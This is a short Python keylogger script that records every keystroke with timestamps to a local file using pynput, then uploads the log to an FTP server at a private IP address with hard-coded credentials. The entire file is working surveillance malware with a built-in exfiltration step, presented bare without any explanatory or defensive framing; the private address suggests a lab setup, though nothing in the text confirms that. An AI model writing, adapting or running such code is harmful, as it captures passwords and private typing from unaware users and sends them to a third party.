from pynput.keyboard import Key, Listener
import ftplib
import logging

logdir = ''
logging.basicConfig(filename=(logdir + 'klog.txt'), level=logging.DEBUG, format='%(asctime)s:%(message)s')

def pressing_key(key):
    try:
        logging.info(str(key))
    except AttributeError:
        print('A special key {0} has been pressed'.format(key))

def releasing_key(key):
    if key == Key.esc:
        return False

print('\nStarted Listening')
with Listener(on_press=pressing_key, on_release=releasing_key) as listener:
    listener.join()

print('\nConnecting to FTP server and sending the data')
sess = ftplib.FTP('192.168.111.133', 'spectre', 'spectre')
file = open('klog.txt', 'rb')
sess.storbinary('STOR klog.res.txt', file)
file.close()
sess.quit()
